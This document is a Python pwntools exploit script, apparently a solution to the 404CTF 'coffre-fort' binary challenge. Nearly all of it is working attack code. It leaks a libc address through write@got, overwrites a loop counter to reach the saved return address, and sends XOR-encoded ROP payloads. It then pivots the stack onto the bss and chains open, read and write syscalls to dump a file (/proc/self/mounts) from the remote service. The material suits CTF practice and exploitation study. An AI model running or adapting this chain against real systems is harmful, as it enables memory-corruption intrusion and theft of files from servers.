#!/usr/bin/env python3

from pwn import *
from time import sleep
import struct

HOST = "challenge.404ctf.fr"
PORT = 30863

exe = ELF("./coffre-fort")
libc = ELF("./libc-2.27.so")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path
context.terminal = ["terminator", "-e"]

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit
b * 0x40135c
r
        """)




def main():
    global r

    tab_1 = "6769514a29baf2e37c541be7762e33c9660d31a32505585eabcd9b540e7421dc703e41fc3e7eea6b8f5cec3b323cecdb02fefbaafbd1057c75be895ca80fb1f105f7e93acacb48641f1e1c64145a5e793b641109aaac1baf33e34815bb22ba7d0b1a7ff8f81bb54e9838793dbc4efa6cac21aa55beb53b5c36b3e2e44f15fd4e"
    tab_1 = bytes.fromhex(tab_1)

    tab_2 = "c773ffedcdabfb47c3f9e98d5b639f9b33b7595b5d17e9d5b3c7b51183413d87e9a1e1670197dd97392bb1fbaf55195d1b43fb3b29e73d95d961f9bb9995ebb3ef01a1e50bd147bd23a97bc573c54b6371259fddd5f3113bcd51475d6f199bf5e11d2329a513cbe933e14d355f77cb05872b1ba3717305d395aff19f334983a9"
    tab_2 = bytes.fromhex(tab_2)

    # tab_1 xor tab_2
    password1 = "a01aaea7e41109a4bfadf26a2d4dac5255ba68f87812b18b180a2e458d351c5b999fa09b3fe937fcb6775dc09d69f58619bd0091d23638e9acdf70e7319a5a42eaf648dfc11a0fd93cb767a1679f151a4a418ed47f5f0a94feb20f48d43b2188ea075cd15d087ea7abd93408e33931692b0ab1f6cfc63e8fa31c137b7c5c7ee7"
    password1 = bytes.fromhex(password1)[:0x20]


    tab_3 = "08d48a549abc0ea8acf34c2d09e5c4afa37fad76de1c4a302085fb07f40b20863ef1d93399a314d9f7a010f694bebc7849e6d0da6a4c51b3843afb9932449be92508e95e60d2d0fad8e86664d987655a3f80447c8957d3ad868017858c667c7c22e4da0bafbcb42fff279307b8112def89b635c72467ed124502e5f877d196f4"
    tab_3 = bytes.fromhex(tab_3)

    tab_4 = "71b329490bd519455b8fd79b430733cd852dd54733edc5f7236db305edb9bbc305ed67b751e3d3355ff3a90501b545fb69231b697f7f25495395319157efbde5cff5e353abb3855535d58399a975718b6329dfa54f5951ad95ede5f10df1c1bbfd6761636383693baf17ad1f6d358d4fd563c1e583d997ed39d90b9d09a5c11f"
    tab_4 = bytes.fromhex(tab_4)

    # tab_3 xor tab_4
    password2 = "7967a31d916917edf77c9bb64ae2f76226527831edf18fc703e8480219b29b453b1cbe84c840c7eca853b9f3950bf98320c5cbb3153374fad7afca0865ab260ceafd0a0dcb6155afed3de5fd70f214d15ca99bd9c60e8200136df2748197bdc7df83bb68cc3fdd1450303e18d524a0a05cd5f422a7be7aff7cdbee657e7457eb"
    password2 = bytes.fromhex(password2)[:0x20]


    tab_5 = "95826caecd68aca6b4cab237cbcfc9806e284c6aedd34c8b229a18fed9459101c9d9012f15877c626972cd653e4971ce754fea648161fe9bbfe97e32f98cc7a402b272ec01f01067995b9fd40a03bc0d9babd501e5d67dc58e2eafc6638a70de561a21010dfd16a1e3d2d24b61556cddbced13e5c7aba4811c1aeb243b1eac6a"
    tab_5 = bytes.fromhex(tab_5)

    tab_6 = "abcb499117bb7bf3a999c32b0961c35f03dbd719d399790157d5d1e5cda3c7ff2b1543ef0361139ffd8171a7abcf4b3ba7777fffebfdc3670d8d4fbd7d6b5b3df5ed17f34d018bcf51178f9961d1a7bfbf0f99d7f3f73f17212d03b9c91f970d892b1b07d98bc3a5cf939935d5d133c3f7dfef21e3dd4d8953ef674d79a9fb69"
    tab_6 = bytes.fromhex(tab_6)

    password3 = "3e49253fdad3d7551d53711cc2ae0adf6df39b733e4a358a754fc91b14e656fee2cc42c016e66ffd94f3bcc295863af5d238959b6a9c3dfcb264318f84e79c99f75f651f4cf19ba8c84c104d6bd21bb224a44cd6162142d2af03ac7faa95e7d3df313a06d476d5042c414b7eb4845f1e4b32fcc42476e9084ff58c6942b75703"
    password3 = bytes.fromhex(password3)[:0x20]

    tab_7 = "f34647260deb1f3ac02abaf8c79e11db600a4db5030d0d5d9b78d54c860ff29c0dfad8b550fd092ae2fb135431324e7675b621282ecf80dc9c191e4ad1734a7b5a0d9ced5b02b53db602c424c8b580d2615616c8ff4da807e133553bee2f2049e27fe36911984118a8c8a21af4fe4b96e8255cae4527e5a98a8a75bcee7f0267"
    tab_7 = bytes.fromhex(tab_7)

    tab_8 = "59072b0fd3b36d3b55ab4ff71773090523a7315ba12347cd8757719deb99eb53a75bb1dbc35d5ba5a3b7479b6323cf5b714d6b712537f963d7b16d4f7d1fe9c1317b37cbbddbdf5357d54d95971331dbe1fd4371cbb58b5f09a7571df16f0381a1f947e3b7b99f234bfd05914915492d15cb8f6d47873f8d712da56bbb3915eb"
    tab_8 = bytes.fromhex(tab_8)

    password4 = "aa416c29de5872019581f50fd0ed18de43ad7ceea22e4a901c2fa4d16d9619cfaaa1696e93a0528f414c54cf5211812d04fb4a590bf879bf4ba87305ac6ca3ba6b76ab26e6d96a6ee1d789b15fa6b10980ab55b934f82358e89402261f4023c84386a48aa621de3be335a78bbdeb02bbfdeed3c302a0da24fba7d0d75546178c"
    password4 = bytes.fromhex(password4)[:0x20]

    # gadget binary
    ret = 0x000000000040101a # ret
    pop_rbp = 0x00000000004011bd # pop rbp ; ret
    pop_rdi = 0x0000000000401643 # pop rdi ; ret
    pop_rsi_r15 = 0x0000000000401641 # pop rsi ; pop r15 ; ret
    edx = 0x000000000040152c  # mov edx, 0x64207a65 ; ret
    pop_rsp = 0x000000000040163d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

    # address binary
    read_plt = 0x4010a0
    write_plt = 0x401090
    write_got = 0x403fc0
    main = 0x00401377
    read_plt = 0x00000000004010a0
    bss = 0x404060

    # gadget libc
    syscall_static = 0x13ff57 # syscall ; ret
    pop_rax_static = 0x000000000001b500 # pop rax ; ret
    pop_rdx_static = 0x0000000000001b96 # pop rdx ; ret
    pop_rbx_static = 0x000000000002c729 # pop rbx ; ret
    mov_rax_static = 0x0000000000043cd7 # mov rax, rbx ; pop rbx ; ret
    mov_rsi_rax_static = 0x000000000014da7e # mov qword ptr [rsi + 8], rax ; ret
    pop_rdx_rsi_static =   0x0000000000130539 # pop rdx ; pop rsi ; ret
    mov_rdx_rax_static = 0x000000000003099c # mov qword ptr [rdx], rax ; ret
    push_rdi_static = 0x0000000000110038 # push rdi ; ret
    push_rsi_static = 0x000000000003e29f # push rsi ; ret
    xor_edi_static = 0x00000000000bcfe2 # xor edi, edi ; mov rax, rdi ; ret
    xor_esi_static = 0x000000000007ec20 # xor esi, esi ; mov rax, rsi ; ret
    pop_rcx_static = 0x00000000000e433e # pop rcx ; ret
    pop_rsi_static = 0x0000000000023a6a # pop rsi ; ret
    mov_rdi_static = 0x00000000000520c9 # mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
    mov_rax_rdi_static = 0x00000000000586bd # mov rax, rdi ; ret
    leave_static =0x00000000000547e3 # leave ; ret
    pop_rbp_static = 0x00000000000213e3 # pop rbp ; ret

    write_static = 0x00000000001100f0

    # Payload 1 - leak libc

    sc1 = p64(pop_rdi)
    sc1 += p64(0x01)
    sc1 += p64(pop_rsi_r15)
    sc1 += p64(write_got)
    sc1 += p64(0xff)
    sc1 += p64(edx)
    sc1 += p64(ret) #align stack
    sc1 += p64(write_plt)
    sc1 += p64(main)


    sc1_xor = b''
    for i in range(len(sc1)):
      sc1_xor += struct.pack("B",(tab_2[0x38+i]^sc1[i]))

    name = b'A' * 8
    name += struct.pack("B",(tab_2[40]^0x37)) # ecraser le compteur de boucle pour pointer sur le saved RIP
    name += b'A' * (0x38 - 0x20 - len(name))
    name += sc1_xor
    name += b'\x00'


    name = name + b'A' * (0x80 - len(name))


    r = conn()
    attach_gdb()

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name)
    rep = r.recvuntil(b'passe.\n')
    r.send(password1)
    print(rep)
    log.success("First payload sent")

    rep = r.recv()
    write_leak = u64(rep[:8])
    log.success("Leak write leak : " + hex(write_leak))


    # compute all libc gadgets
    offset = write_leak - write_static

    syscall = offset + syscall_static
    pop_rax = offset + pop_rax_static
    pop_rdx = offset + pop_rdx_static
    mov_rax = offset + mov_rax_static
    mov_rsi_rax = offset + mov_rsi_rax_static
    pop_rdx_rsi = offset + pop_rdx_rsi_static
    mov_rdx_rax = offset + mov_rdx_rax_static
    push_rdi = offset + push_rdi_static
    push_rsi = offset + push_rsi_static
    xor_edi = offset + xor_edi_static
    xor_esi = offset + xor_esi_static
    pop_rbx = offset + pop_rbx_static
    pop_rcx = offset + pop_rcx_static
    pop_rsi = offset + pop_rsi_static
    mov_rax_rdi = offset + mov_rax_rdi_static
    mov_rdi = offset + mov_rdi_static
    leave = offset + leave_static
    pop_rbp = offset + pop_rbp_static


    # compute used offsets on the bss
    offset_file_name = 0x00
    offset_file_name2 = offset_file_name + 0x08
    offset_file_name3 = offset_file_name2 + 0x08
    offset_file_name4 = offset_file_name3 + 0x08
    offset_file_name5 = offset_file_name4 + 0x08
    offset_fd = offset_file_name5 + 0x08
    offset_rop = offset_fd + 0x08
    offset_buffer = offset_rop + 0x08 * (304-233-12)
    size_read = 0x400

    #contenu_ultra_secret_du_coffre_fort.txt

    # filename = b'contenu_'
    # filename2 = b'ultra_se'
    # filename3 = b'cret_du_'
    # filename4 = b'coffre_f'
    # filename5 = b'ort.txt'

    filename = b'/proc/se'
    filename2 = b'lf/mount'
    filename3 = b's'
    filename4 = b''
    filename5 = b''

    # Payload 2 - write something somewhere

    sc2 = p64(bss+0x500) # stak pivoting
    sc2 += p64(pop_rdx_rsi)
    sc2 += p64(0x0)
    sc2 += p64(bss + offset_file_name)
    sc2 += p64(pop_rax)
    sc2 += filename + b'\x00' * (8-len(filename))
    sc2 += p64(mov_rsi_rax)
    sc2 += p64(ret)
    sc2 += p64(main)


    sc2_xor = b''
    for i in range(len(sc2)):
      sc2_xor += struct.pack("B",(tab_4[0x30+i]^sc2[i]))

    name2 = b'B' * 8
    name2 += struct.pack("B",(tab_4[40]^0x2f))
    name2 += b'B' * (0x30 - 0x20 - len(name2))
    name2 += sc2_xor
    name2 += b'\x00'

    name2 = name2 + b'B' * (0X80 - len(name2))

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name2)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password2)
    log.success("Second payload sent")


    # Prepare the ROPchain

    #file name end
    rop = p64(pop_rdx_rsi)      # bss + 0x100
    rop += p64(0x0)
    rop += p64(bss + offset_file_name2 )
    rop += p64(pop_rax)
    rop += filename2 + b'\x00' * (8-len(filename2))
    rop += p64(mov_rsi_rax)

    rop += p64(pop_rdx_rsi)
    rop += p64(0x0)
    rop += p64(bss + offset_file_name3 )
    rop += p64(pop_rax)
    rop += filename3 + b'\x00' * (8-len(filename3))
    rop += p64(mov_rsi_rax)

    rop += p64(pop_rdx_rsi)
    rop += p64(0x0)
    rop += p64(bss + offset_file_name4 )
    rop += p64(pop_rax)
    rop += filename4 + b'\x00' * (8-len(filename4))
    rop += p64(mov_rsi_rax)

    rop += p64(pop_rdx_rsi)
    rop += p64(0x0)
    rop += p64(bss + offset_file_name5 )
    rop += p64(pop_rax)
    rop += filename5 + b'\x00' * (8-len(filename5))
    rop += p64(mov_rsi_rax)

    #open
    rop += p64(pop_rdi)
    rop += p64(bss+8)	    # +8 because of mov qword ptr [rsi + 8], rax ; ret
    rop += p64(pop_rsi)
    rop += p64(0)	    # flag : 0 1 2 = R W RW / 64 = CREATE
    rop += p64(pop_rdx)
    rop += p64(0)	    # mode : 448 = RWX
    rop += p64(pop_rax)
    rop += p64(0x40000002)
    rop += p64(syscall)

    rop += p64(pop_rsi)
    rop += p64(bss + offset_fd)
    rop += p64(mov_rsi_rax)
    #read
    rop += p64(pop_rdi)
    rop += p64(bss+8+offset_fd-0x68) # -0x68 because of mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
    rop += p64(mov_rdi)
    #rop += p64(pop_rdi)
    #rop += p64(3)
    rop += p64(pop_rsi)
    rop += p64(bss+offset_buffer)
    rop += p64(pop_rdx)
    rop += p64(size_read)
    rop += p64(read_plt)

    # write
    rop += p64(pop_rdi)
    rop += p64(0x01)
    rop += p64(pop_rdx_rsi)
    rop += p64(size_read)
    rop += p64(bss+offset_buffer)
    rop += p64(write_plt)





    # Payload 3 - call to read, read rop from stdin
    sc3 = p64(pop_rdi)
    sc3 += p64(0x00)
    sc3 += p64(pop_rdx_rsi)
    sc3 += p64(len(rop))
    sc3 += p64(bss+offset_rop)
    sc3 += p64(read_plt)
    sc3 += p64(ret)
    sc3 += p64(main)


    sc3_xor = b''
    for i in range(len(sc3)):
      sc3_xor += struct.pack("B",(tab_6[0x38+i]^sc3[i]))

    name3 = b'C' * 8
    name3 += struct.pack("B",(tab_6[40]^0x37))
    name3 += b'C' * (0x38 - 0x20 - len(name3))
    name3 += sc3_xor
    name3 += b'\x00'

    name3 = name3 + b'C' * (0X80 - len(name3))

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name3)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password3)
    log.success("Third payload sent")

    # send the ROPchain
    r.send(rop)


    # Payload 4 - pivoting the stack where the ROP has been put
    sc4 = p64(pop_rsp)
    sc4 += p64(bss+offset_rop-3*8)
    sc4 += p64(0x00)
    sc4 += p64(0x00)
    sc4 += p64(0x00)




    sc4_xor = b''
    for i in range(len(sc4)):
      sc4_xor += struct.pack("B",(tab_8[0x38+i]^sc4[i]))

    name4 = b'C' * 8
    name4 += struct.pack("B",(tab_8[40]^0x37))
    name4 += b'C' * (0x38 - 0x20 - len(name4))
    name4 += sc4_xor
    name4 += b'\x00'

    name4 = name4 + b'C' * (0X80 - len(name4))

    rep = r.recvuntil(b'identifiant.\n')
    print(rep)

    r.send(name4)
    rep = r.recvuntil(b'passe.\n')
    print(rep)

    r.send(password4)
    log.success("Fourth payload sent")


    rep = r.recv()

    print(rep)
    print(len(rep))

    with open("exfiltr.bin","wb") as exfiltr:
      exfiltr.write(rep)

if __name__ == "__main__":
    main()
